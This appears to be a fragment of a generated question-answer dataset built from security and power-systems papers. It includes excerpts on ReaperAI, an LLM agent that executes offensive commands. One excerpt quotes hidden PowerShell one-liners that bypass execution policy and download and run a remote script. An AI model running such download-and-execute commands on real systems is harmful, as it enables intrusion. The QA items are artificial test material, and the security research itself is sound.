2\nGroup 1\nEntities\n(b) Modified configuration.\nFig. 1. An illustrative example of a PE due to IAM misconfiguration, derived from a notable real-world incident\nin 2019. Figure (a) shows the original IAM configuration, where the entity-entity and entity-permission\nconnections are highlighted in blue and orange, respectively. Figure (b) shows the modified IAM configuration\nin the PE, where the modification is highlighted in red.\nFigure 1a presents an IAM configuration example as a relational graph. In the example, there\nare six entities with four entity types: one user group Group 1, two users User 1 and User 2, one\nservice Service 1, and two roles Role 1 and Role 2. Besides, there are three permissions: Perm\n1, Per']","TAC’s whitebox variant successfully detected all PEs and significantly outperforms all three state-of-the-art whitebox baselines. Given a query budget of 100, TAC identifies 6% to 38% more PEs with 16% to 23% fewer queries on average than all its three greybox variants, demonstrating the superiority of our pretraining based deep RL approach.",reasoning,"[{'Published': '2024-06-08', 'Title': 'Interactive Greybox Penetration Testing for Cloud Access Control using IAM Modeling and Deep Reinforcement Learning', 'Authors': 'Yang Hu, Wenxi Wang, Sarfraz Khurshid, Mohit Tiwari', 'Summary': 'Identity and Access Management (IAM) is an access control service in cloud\nplatforms. To securely manage cloud resources, customers need to configure IAM\nto specify the access control rules for their cloud organizations. However,\nincorrectly configured IAM can be exploited to cause a security attack such as\nprivilege escalation (PE), leading to severe economic loss. To detect such PEs\ndue to IAM misconfigurations, third-party cloud security services are commonly\nused. The state-of-the-art services apply whitebox penetration testing\ntechniques, which require access to complete IAM configurations. However, the\nconfigurations can contain sensitive information. To prevent the disclosure of\nsuch information, customers need to manually anonymize the configuration.\n  In this paper, we propose a precise greybox penetration testing approach\ncalled TAC for third-party services to detect IAM PEs. To mitigate the dual\nchallenges of labor-intensive anonymization and potentially sensitive\ninformation disclosures, TAC interacts with customers by selectively querying\nonly the essential information needed. Our key insight is that only a small\nfraction of information in the IAM configuration is relevant to the IAM PE\ndetection. We first propose IAM modeling, enabling TAC to detect a broad class\nof IAM PEs based on the partial information collected from queries. To improve\nthe efficiency and applicability of TAC, we aim to minimize interactions with\ncustomers by applying Reinforcement Learning (RL) with Graph Neural Networks\n(GNNs), allowing TAC to learn to make as few queries as possible. Experimental\nresults on both synthetic and real-world tasks show that, compared to\nstate-of-the-art whitebox approaches, TAC detects IAM PEs with competitively\nlow false negative rates, employing a limited number of queries.', 'entry_id': 'http://arxiv.org/abs/2304.14540v5', 'published_first_time': '2023-04-27', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SE'], 'links': ['http://arxiv.org/abs/2304.14540v5', 'http://arxiv.org/pdf/2304.14540v5']}]",True
"How does lack of local reactive power support affect short-term voltage stability, and how does pre-fault status impact emergency control?","['A. Overall Framework\nThe overall framework of our proposed emergency control\npre-decision making scheme via SRL is shown in Fig. 1, which\nincludes two parts: the AL-based security margin estimator\nwith a state-action joint network structure, and the projection-\nbased pre-decision making module. In the proposed frame-\nwork, the initial control actions generated by the DRL agent\ndo not directly take effect. Instead, they pass through a security\nmargin estimator constructed by a NN. Subsequently, these\nactions are adjusted based on the gradient of the estimated\nmargin before being implemented.\n4\nSimulated System\nSimulated System\nOperating Status \ns1, s2, ...\nAL-based Security Margin Estimation\nPre-emptive Control Module with Gradient-based SRL\nSelect (s, a) via Uncertainty\nOperating Dataset \nwith Fault fn\nOperating Dataset \nwith Fault fn\nPre-emptive \nAction Making \nBlock\n (via SAC)\nSampled \nOperation \nStatus st\nat,0\na\uf0a2t\nOutput\nCalculating \nSecurity Margin\nTraining\nSecurity Margin Estimator\nDataset Dn with action\nc1(s, f )\nsi\nai\nAction \nset A\nAction \nset A\nControl Action \na1, a2, ...\nOperating statuses with \nmaximum uncertainty\nState-action pairs with \nmaximum uncertainty\nLabeling\nGenerating\nc(s,a)\nSafety \nCorrection \nLayer\n(via Gradient)\nApplying gradient\n\uf0d1ac(s,a, f ) \nRisk \nFig. 1. Framework for proposed SRL-based pre-decision making scheme to\nagainst short-term voltage instability.\nB. Active Learning-based Security Margin Estimation\nIt is widely considered that short-term voltage instability\noften stems from inadequate local reactive power support\n[25]. In a receiving-end system, the post-fault stability is\nintricately linked to the pre-fault operating status. Additionally,\nthe efficacy of emergency control measures implemented to\nmitigate fault progression is contingent upon the initial status.\nConsequently, estimating the system’s post-fault stability and\nthe ‘margin’ is achievable by checking the operational points\nand the corresponding emergency control measures [26].\nThis subsection will detail the architecture of the envisioned\nsecurity margin estimation module, encompassing the basic\ntheory, the network structure, the pivotal samples selecting\nmethodology, and the training methodology.\n1) Security Margin Estimation via DSR: The theory of se-\ncurity regions [23] maintains that the power system’s security\nregion ADSR is well-defined within the context of injected\npower space for a given network topology, system component\nparameters, and the location of pre-determined faults. Without\nemergency control measures, the operating point’s dynamic\nsecurity margin (DSM) is quantified as the distance from\nthe operating point to the dynamic security region boundary.\nSince the security region is delineated by hyperplanes, the\ncomputation of the DSM bifurcates into two processes: firstly,\nthe delineation of the security region’s boundary ∂ADSR,\nand secondly, solving for the minimum distance from the\noperational point to points on the designated boundary, which\nis shown in Fig. 2(a). The definition of DSM is as follows:\nDSM = min dis(P, PC),\ns.t. PC ∈∂ADSR\n(7)\nwhere P is the operating point in injected power space and PC\nis a point on the boundary. The term ‘dis’ refers to Euclidean\ndistance. This representation transforms the solution of the\n(c)\n*\n*\n*\n*\n×\n×\nP1\nP2\nNon-Linear PDSR \nBoundary\nDSMPos\nDSMNeg\n×\n×\n×\nPL1\nPL2\nFeasible Action \nBoundary\nBefore \nUVLS\nAfter \nfeasible \nUVLS\n(a)\n(b)\nUVLS  \nAction\nSecure\nInsecure\nStable Region\nUnstable \nRegion\nt0\nt0\nt1\nt1\nt2\nt2\ntn\ntn\nFault \nOccur\nFault \nClear\nShedding\nQuasi-steady \nStatus\nU\nt\nFeasible Shedding\nNo Shedding\nor Failed Shedding\n', ' enhances the security margin\nestimator’s training process by swiftly identifying critical oper-\nating points within complex power systems. This enhancement\nsignificantly boosts the security margin estimator’s training\nefficiency. Moreover, its high practical value is underscored\nby its applicability to large-scale power systems for effectively\ncapturing critical operating conditions.\nThe remainder of the paper is structured as follows. Section\nII briefly introduces the basic knowledge of pre-decision\nmaking, SRL algorithm, and AL. Section III elaborates the\nproposed framework, including the AL-based security margin\nestimator and the gradient projection-based short-term voltage\nstability emergency control pre-decision making module. The\nNew England 39-bus system and the Guangdong Provincal\nPower Grid (GPG) are utilized to test the performance of our\nframework in Section IV. Section V concludes the paper.\nII. PRELIMINARIES\nA. Safe Reinforcement Learning (SRL)\nReinforcement learning involves continuous interaction with\nthe environment to ascertain the most effective strategy via\ntrial and error. However, in some practical applications, includ-\ning autonomous driving and power system operations, faulty\npolicies can result in substantial economic repercussions or\ncompromise safety [13]. Hence, the imperative to integrate\nsafety considerations during the training or operational phases\nin such contexts has precipitated the emergence of SRL algo-\nrithms. Depending on the form of constraints, safe reinforce-\nment learning can be categorized into two types: process-wise\nsafe reinforcement learning and state-wise safe reinforcement\nlearning. Initial endeavors of process-wise safe reinforcement\nlearning were grounded on the constrained Markov decision\nprocesses (CMDP) framework, wherein constraints are articu-\nlated as either cumulative or episodic. However, real-world\nscenarios often involve transient and deterministic critical\nconstraints, which, if violated, can lead to catastrophic task\nfailure [21]. Therefore, it is necessary to introduce more\nrobust constraints in reinforcement learning. Unlike process-\nwise safe reinforcement learning, state-wise SRL is based on\nthe SCMDP, where the safety specification is to satisfy a\nhard cost constraint at every step persistently. Similarly, the\ncost functions are denoted with C1, C2, ..., and the feasible\nstationary policy set ¯\nΠC for SCMDP is defined as:\n¯\nΠC = {π ∈Π|∀(st, at, st+1) ∼τ,\n∀i, Ci(st, at, st+1) ≤ωi}\n(1)\nwhere τ ∼π, ωi ∈R, and π is the agent’s policy. Compared\nto process-wise SRL, state-wise SRL has stronger constraint\neffects and is more suitable for scenarios with stricter state\nsecurity demand.\nThe purpose of state-wise SRL is to find a policy that max-\nimizes the cumulative gain G = P∞\nt=0 γtrt while satisfying\nthe security constraints, which is mathematically expressed as\nmax\nθ\nG(πθ),\ns.t. πθ ∈¯\nΠC\n(2)\n3\nwhere rt denotes the reward at t, γ denotes the discount factor,\nand πθ is the agent’s parameterized policy.\nB. Pre-decision making and its SCMDP Modeling\nPre-decision making plays a crucial role in preventing\nfault propagation and safeguarding power system security and\nstability. In this approach, emergency control strategies are\npre-generated based on the system’s operating state and a\npredefined set of potential faults. When a fault occurs, the\nstability control apparatus consults these pre-established rules\naccording to the fault type and the existing operating condition\nand then executes the necessary emergency control actions\naccording to pre-determined criteria. Emergency control mea-\nsures in power systems, such as load shedding, generator\ntripping, and modulating DC transmission line power, are es-\nsential for preventing system collapse and enhancing stability.\nIn this context, we focus on load shedding as a representative\nexample. Our proposed pre-decision making scheme aims to\naddress short-term voltage instability, minimizing the impact\nof faults while keeping costs as low as possible. Specifically,\nwe seek to reduce the amount of load shedding required to\nstabilize the system’s voltage after a fault. The mathematical\nformulation of the power system’s short-term voltage stability\ncontrol pre-decision making process is delineated as follows:\narg min\nat∈A']","Lack of local reactive power support often leads to short-term voltage instability. In a receiving-end system, the post-fault stability is intricately linked to the pre-fault operating status. The efficacy of emergency control measures implemented to mitigate fault progression is contingent upon the initial status.",multi_context,"[{'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}, {'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}]",True
"How do JSON prompts and subprocess piping improve LLM-Python interaction in ReaperAI, aiding real-time decisions in pen tests?","['\nFigure4.6, the LLM is equipped to reflect on its recent actions and respond appro-\npriately. This level of analysis is also beneficial for the human observer, enabling\nthem to monitor the LLM’s performance and ensure that it is operating correctly.\nThis dual focus on analysis helps maintain the integrity and effectiveness of the\nprocess.\nThis method, seen in Figure 4.7, is essential for conducting comprehensive\nand effective penetration tests, as it allows the AI to adapt its recommendations\nbased on real-time data and the evolving state of the system being tested. This\nongoing contextual awareness, seen in Figure 4.8, ensures that AI’s contributions\nare not only technically appropriate but also strategically astute, thereby enhanc-\ning the overall effectiveness of the penetration testing process by also giving a\nperspective view on what was just conducted on the terminal.\n25\nFigure 4.6: A Sample of State at a Given Time\nFigure 4.7: State Workflow\nFigure 4.8: Sample Analyzation at a Given Time\n4.6\nCommand Execution\n4.6.1\nNon-Interactive Execution\nArguably, one of the most complex aspects of this project involved devising\na unique method for the large language model to interact with a program. This\npaper previously outlined the significant challenge of lacking a standardized ap-\nproach for establishing bidirectional communication between a Python program\nand the LLM. In the ReaperAI system, JSON and structured prompts serve as the\nmain channels for this interaction, ensuring that outputs from the LLM are con-\nsistent, and well-formatted to allow parsing from within Python. Although the\nLLM can process a broad spectrum of information, the primary difficulty resides\n26\nin parsing, extracting, and applying the right information from the LLM and us-\ning that in a way that is effective.\nThis execution strategy draws inspiration from the concepts presented by\nHappe and hackingbuddyGPT Happe and Cito [2023] in 2023, yet deviates from\ntheir model by not using SSH to execute commands remotely. Instead, commands\nare run locally on a Kali machine using Python’s subprocess piping mechanism.\nDepending on the objectives and current tasks, ReaperAI formats this informa-\ntion into a prompt to solicit a command from the LLM. The command received\nfrom the LLM, structured as a JSON output, is then converted into an actual com-\nmand string that the subprocess can execute. This method ensures a seamless\ntranslation of LLM outputs into executable actions, optimizing the interaction\nbetween the LLM and the Python environment.\n4.6.2\nInteractive Execution\nInteractive execution is also a crucial feature of the script, facilitated by a tool\ncalled ’pexpect’ Spurrier [2013]. This tool allows the agent to interact dynamically\nwith the command-line interface, handling commands generated by the LLM.\nThe reason for the attention to this is that traditional one time run programs sig-\nnal an end to the terminal with an EOF, so the operator knows when to read the\nstdout. When commands prompt for user input, the EOF has not been reached\nyet, so we have to resort to another library for this concept. ”Pexpect is a pure\nPython module for spawning child applications; controlling them; and responding to ex-\npected patterns in their output. Pexpect works like Don Libes’ Expect. Pexpect allows\nyour script to spawn a child application and control it as if a human were typing com-\nmands” Spurrier [2013]. This simulates a human-like interaction with the system.\nThis process is managed by a separate command agent, which determines the\nappropriate times to send new inputs or read outputs from the command line,\nenhancing the program’s ability to handle complex sequences of commands that\nrequire interactive responses. This functionality is still not fully supported in\nReaperAI, but can be seen in Figure 4.9. The proof of concept demoed in ReaperAI,\nis based around metasploit, but the workflow was designed to be universal to-\nwards other interactive programs like smbclient, netcat, etc.\nReading of Interactive Output\nTo mimic human interaction patterns, ReaperAI\nutilizes a non-blocking read operation in a separate thread, allowing it to con-\ntinuously monitor the output as it becomes available for interactive programs.\nThis method involves periodically reading every line of output within a speci-\nfied time frame, much like a human will wait for, and read command outputs\nintermittently. The collected data is then updated and fed back to the LLM for\nfurther analysis, ensuring that the AI has the most current information to base its\nnext set']","JSON and structured prompts serve as the main channels for interaction between the LLM and a Python program in ReaperAI. This ensures that outputs from the LLM are consistent and well-formatted, allowing for effective parsing within Python. Commands are run locally on a Kali machine using Python’s subprocess piping mechanism. The command received from the LLM, structured as a JSON output, is then converted into an actual command string that the subprocess can execute. This method ensures a seamless translation of LLM outputs into executable actions, optimizing the interaction between the LLM and the Python environment.",multi_context,"[{'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}]",True
"How does Comp. Syntax Accuracy handle parse errors in PowerShell cmds vs. ref cmds, and impact eval of syntax correctness in exec analysis and cmd quality?","[' PowerShell code. Both the generated commands\nand their corresponding references are then subjected to the\nsyntax analyzer.\nTo assess the syntactic quality of the generated commands,\nwe introduce two distinct metrics: Single Syntax Accuracy\nand Comparative Syntax Accuracy. The metrics are defined\nas follows:\n• Single Syntax Accuracy: evaluates the percentage of\ncommands without parse errors. This evaluation is in-\ndependent of the reference commands from the ground\ntruth.\n• Comparative Syntax Accuracy: assesses the syntactic\ncorrectness of the generated commands by considering\nthe results alongside the reference commands. When\nboth commands present common parse errors, these are\nexcluded from the counting process. Given that some ref-\nerence commands include stub templates such as <code>\nTest Set\nParseError (%)\nError (%)\nWarning (%)\nCodeT5+\n8.85\n1.94\n35.92\nCodeGPT\n1.77\n2.70\n29.73\nCodeGen\n1.77\n1.80\n31.53\nGround Truth\n2.65\n0.00\n39.09\nTable 7: Summary of ParseError, Error, and Warning percent-\nages for models and ground truth on the test set.\n14\n22\n3\n4\n14\n14\n5\n2\n17\n7\n5\n4\n16\n10\n5\n6\n0\n5\n10\n15\n20\n25\nAvoidUsingInvokeExpression\n AvoidUsingCmdletAliases\n AvoidUsingWMICmdlet\n UseDeclaredVarsMoreThanAssignments\nNumber of Warnings\nWarnings \nCodeT5+\nCodeGPT\nCodeGen\nGround Truth\nFigure 4: Counts for different warning types in each test set.\nor <command>, the analysis filters out parse errors asso-\nciated with these templates, specifically the Redirection-\nNotSupported and MissingFileSpecification errors.\nThe workflow for the syntactic analysis is depicted in Fig-\nure 3. Looking at the results in Table 6, it is possible to notice\nthat all the models achieved a score greater than 90%, assess-\ning their strong capability to generate syntactically correct\ncode. CodeGPT and CodeGen, in general, demonstrate high\nperformance across both syntax metrics. Table 7 summarizes\nthe percentages for various severity types in the test set. Given\nthat warning frequencies are consistently above 30% for all\nmodels, including the ground truth, Figure 4 enumerates the\nvarious warning types within each set.\n4.4\nExecution Analysis\nThe execution analysis aims to evaluate the generated offen-\nsive PowerShell code when running in an actual system. This\ninvolves assessing the ability of the code to behave as intended\nin terms of effects caused on the system. Therefore, we run\nboth code from the ground truth and generated code, monitor\ntheir behavior at runtime, and compare the behavioral events\n10\nExecution Analysis\nWindows 10 VM\nPre-trained\nmodels\nTest Set\nReference \ncommands\nNL Intents\nGenerated\ncommands\nSysmon\nSecurity \nTools\nEvent \nFiltering\nExecution\nEvaluation\nFigure 5: Execution analysis workflow.\nGround truth\nevents\nGenerated code\nevents\n188\n151\n145\npowershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle\nHidden -Command ""IEX (Invoke-WebxRequest –Uri \'https://raw.githubusercontent.com/Powershell-\nScripts-for-Hackers-and-Pentesters/main/scripts/all_in_one_enum.ps1\').Content""Whitecat18\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Invoke-WebRequest\nhttps://raw.githubusercontent.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters/main/\nscripts/all_in_one_enum.ps1 -OutFile hello.ps1; .\\hello.ps1""\npwsh.exe>C:\\Windows\\System32\\ntdll.dll\npwsh.exe>C:\\Windows\\System32\\gdi32full.dll\n...\npowershell.exe>C:\\Windows\\System32\\sxs.dll\npowershell.exe>C:\\Windows\\System32\\umpdc.dll\npwsh.exe>C:\\Windows\\System32\\ntdll.dll\npwsh.exe>C:\\Windows\\System32\\gdi32full.dll\n...\npwsh.exe>C:\\Program \nFiles\\PowerShell\\7\\System.']","Comparative Syntax Accuracy assesses the syntactic correctness of the generated commands by considering the results alongside the reference commands. When both commands present common parse errors, these are excluded from the counting process. This approach helps in evaluating the syntax correctness more accurately by filtering out errors associated with stub templates, such as Redirection-NotSupported and MissingFileSpecification errors.",multi_context,"[{'Published': '2024-04-19', 'Title': 'The Power of Words: Generating PowerShell Attacks from Natural Language', 'Authors': 'Pietro Liguori, Christian Marescalco, Roberto Natella, Vittorio Orbinato, Luciano Pianese', 'Summary': 'As the Windows OS stands out as one of the most targeted systems, the\nPowerShell language has become a key tool for malicious actors and\ncybersecurity professionals (e.g., for penetration testing). This work explores\nan uncharted domain in AI code generation by automatically generating offensive\nPowerShell code from natural language descriptions using Neural Machine\nTranslation (NMT). For training and evaluation purposes, we propose two novel\ndatasets with PowerShell code samples, one with manually curated descriptions\nin natural language and another code-only dataset for reinforcing the training.\nWe present an extensive evaluation of state-of-the-art NMT models and analyze\nthe generated code both statically and dynamically. Results indicate that\ntuning NMT using our dataset is effective at generating offensive PowerShell\ncode. Comparative analysis against the most widely used LLM service ChatGPT\nreveals the specialized strengths of our fine-tuned models.', 'entry_id': 'http://arxiv.org/abs/2404.12893v1', 'published_first_time': '2024-04-19', 'comment': '18th USENIX WOOT Conference on Offensive Technologies, GitHub Repo:\n  https://github.com/dessertlab/powershell-offensive-code-generation', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SE'], 'links': ['http://arxiv.org/abs/2404.12893v1', 'http://arxiv.org/pdf/2404.12893v1']}]",True
How does UE Sec Reloaded boost Open5GS & srsRAN for 5G SA UE?,"[' TAMELESS can analyse threats, verify security\nproperties, and produce graphical outputs of its analyses, thereby assisting security architects in identifying\noptimal prevention and mitigation solutions.\nThe efficiency and applicability of TAMELESS have been\ndemonstrated through case study evaluations involving unauthorised access to safe boxes, web servers, and\nwind farms, showcasing its effectiveness in real-world scenarios.\nAppendix C.85. TChecker: Precise Static Inter-Procedural Analysis for Detecting Taint-Style Vulnerabilities\nin PHP Applications\nTChecker (2022, Luo et al. [135]) introduces a context-sensitive inter-procedural static taint analysis\ntool specifically tailored for PHP applications, addressing the challenge of taint-style vulnerabilities like SQL\ninjection and cross-site scripting.\nBy modelling PHP objects and dynamic language features, TChecker\nconducts iterative data-flow analysis to refine object types and accurately identify call targets. Comprehens-\nive evaluations across diverse modern PHP applications showcased TChecker’s effectiveness, discovering 18\npreviously unknown vulnerabilities while outperforming existing static analysis tools in vulnerability detec-\ntion. It not only detected more vulnerabilities but also maintained a relatively good precision, surpassing\ncompetitors while releasing its source code to foster further research in this domain.\nAppendix C.86. Detecting and exploiting second order denial-of-service vulnerabilities in web applications\nTORPEDO (2015, Olivo et al. [136]) is a second-order vulnerability scanning tool that detects Denial of\nService (DoS), Cross-Site Scripting (XSS), and SQL Injection. The program searches for two-phased DoS\nattacks that work by polluting a database with junk entries and resource exhaustion. When applied to six\nhighly used web apps, it detected thirty-seven vulnerabilities and eighteen false positives.\nAppendix C.87. UE Security Reloaded: Developing a 5G Standalone User-Side Security Testing Framework\nUE Security Reloaded (2023, Hoang et al. [137]) is an open-source security testing framework specific-\nally developed for 5G Standalone (SA) User Equipment (UE). This tool enhances existing open-source suites\n(Open5GS and srsRAN) by creating an extensive range of test cases for both the 5G Non-Access Stratum\n(NAS) and Radio Resource Control (RRC) layers. Such an approach offers in-depth insights through exper-\niments on 5G SA mobile phones. The framework allows for the transmission of 5G control-plane messages\n(NAS and RRC) to a UE and facilitates the modification of these messages to examine the UE’s reactions\nunder a variety of conditions.\nAppendix C.88. Untangle: Aiding Global Function Pointer Hijacking for Post-CET Binary Exploitation\nUntangle (2023, Bertani et al. [138]) is a tool that exploit global function pointer hijacking in order\nto defeat Intel’s Control-Flow Enforcement Technology (CET) The method combines symbolic execution\nand static code analysis to identify global function pointers within C libraries, which, when compromised,\nfacilitate control-flow hijacking attacks. Experimental results demonstrated the effectiveness of Untangle in\nidentifying global function pointers across eight widely used open-source C libraries.\nAppendix C.89. VAPE-BRIDGE: Bridging OpenVAS Results for Automating Metasploit Framework\nVAPE-BRIDGE (2022, Vimala et al. [139]) is a tool designed to streamline the transition between vulner-\nability assessment (VA) and penetration testing (PenTest) processes by automating the conversion of scan\nresults from the Open Vulnerability Assessment Scanner (OpenVAS) into executable scripts for the Metas-\nploit Framework. The VAPE-BRIDGE system comprises three main components: Scan result extraction,\nresponsible for parsing the VA scan results from OpenVAS; Target list repository, accountable for maintain-\ning a database of identified vulnerabilities to be used in the PenTest process; and the Automated shell scripts\nexploitation, which generates shell scripts based on the extracted vulnerabilities, which are then executed\nwithin Metasploit to simulate attacks and test the system’s resilience.\n47\nAppendix C.90. Vera: A flexible model-based vulnerability testing tool\nVERA (2013, Blome et al. [140]) is an automated tool that supports Penetration Testers to define attacker\nmodels (separating payloads and behaviour) using state machines for vulnerability analysis in web applica-\ntions. The models acquired are then converted into libraries for specific vulnerability targeting. The tool is\nhighly flexible with the availability to expand and integrate custom libraries to enhance functionality.\nAppendix C.91. V']","UE Security Reloaded enhances existing open-source suites (Open5GS and srsRAN) by creating an extensive range of test cases for both the 5G Non-Access Stratum (NAS) and Radio Resource Control (RRC) layers. This approach offers in-depth insights through experiments on 5G SA mobile phones, allowing for the transmission and modification of 5G control-plane messages (NAS and RRC) to examine the UE’s reactions under various conditions.",reasoning,"[{'Published': '2024-07-19', 'Title': 'Bridging the Gap: A Survey and Classification of Research-Informed Ethical Hacking Tools', 'Authors': 'Paolo Modesti, Lewis Golightly, Louis Holmes, Chidimma Opara, Marco Moscini', 'Summary': ""The majority of Ethical Hacking (EH) tools utilised in penetration testing\nare developed by practitioners within the industry or underground communities.\nSimilarly, academic researchers have also contributed to developing security\ntools. However, there appears to be limited awareness among practitioners of\nacademic contributions in this domain, creating a significant gap between\nindustry and academia's contributions to EH tools. This research paper aims to\nsurvey the current state of EH academic research, primarily focusing on\nresearch-informed security tools. We categorise these tools into process-based\nframeworks (such as PTES and Mitre ATT\\&CK) and knowledge-based frameworks\n(such as CyBOK and ACM CCS). This classification provides a comprehensive\noverview of novel, research-informed tools, considering their functionality and\napplication areas. The analysis covers licensing, release dates, source code\navailability, development activity, and peer review status, providing valuable\ninsights into the current state of research in this field."", 'entry_id': 'http://arxiv.org/abs/2407.14255v1', 'published_first_time': '2024-07-19', 'comment': 'This is the extended version of the paper published in the Journal of\n  Cybersecurity and Privacy, 4, no. 3: pp 410-448, 2024', 'journal_ref': 'Volume 4, Issue 3: pp 410-448, 2024', 'doi': '10.3390/jcp4030021', 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://dx.doi.org/10.3390/jcp4030021', 'http://arxiv.org/abs/2407.14255v1', 'http://arxiv.org/pdf/2407.14255v1']}]",True
How do the agent's actions and observations interact with the RM's state-transitions and rewards to enable lateral movement in enterprise networks?,"[' consisting of seven components ⟨S, A, O, T(st+1|st, at), O(ot|st), R, γ⟩[22].\nS represents the set of environment states, where st ∈S denotes the state at time t. O represents the set of observa-\ntions, and ot ∈O denotes the observation at time t. A represents the set of actions, and at ∈A denotes the action\ntaken by the agent at time t. T(st+1|st, at) is the probability of transition from the current state st to the next state st+1\nwhen the agent performs an action at. O(ot|st) is the emission function that maps the current state to the observation\nreceived by the agent.\nR is the RM, which is a tuple with six components R = ⟨P, L, U, u0, δu, δr⟩. P is an event set of PT. L is the labeling\nfunction (event detector), L : O × A × O →2P, which assigns truth values to events (True: event occurred, False:\nevent not occurred), by analyzing the input experience (ot, at, ot+1). U is a finite set of RM states. u0 ∈U is an\ninitial state. δu is the state-transition function, δu : U × 2|P | →U, which determines the next RM state based on\nits current state and the captured events (i.e., ut+1 ←δu(ut, L(ot, at, ot+1))). δr is the reward-transition function,\nδr : U ×2|P | →[O ×A×O →R], which outputs a reward function based on its current state and the captured events\n(i.e., R(ot, at, ot+1) ←δr(ut, L(ot, at, ot+1))). The agent can use the output reward function to obtain the reward.\nγ ∈[0, 1) is the discount factor that determines the trade-off between immediate and long-term rewards that the agent\nprefers to achieve.\nDue to the complex nature of the target network system, the determination of T(st+1|st, at) and O(ot|st) poses\nchallenges for PT. However, the agent can take the environment as a black box and learn the policy through pure trial\nand error.\nFor a specific scope of PT, the action space, observation space, and RM can be customized accordingly.\n3\nPOMDP with RM Design for Lateral Movement\nIn this work, the lateral movement on enterprise networks is considered as the study case of PT, which is under the\nassumption that the agent has already entered the target network (post-exploitation assumption). The POMDP with\nRM formulation and two RMs are designed in the following subsections.\n3.1\nAction Space\nWe consider three types of actions that the agent can execute during lateral movement. The first is scanning, which\ninvolves collecting network information by discovering new machines (nodes), determining the connections between\nthese nodes, acquiring machine configuration data, and gathering vulnerability information for 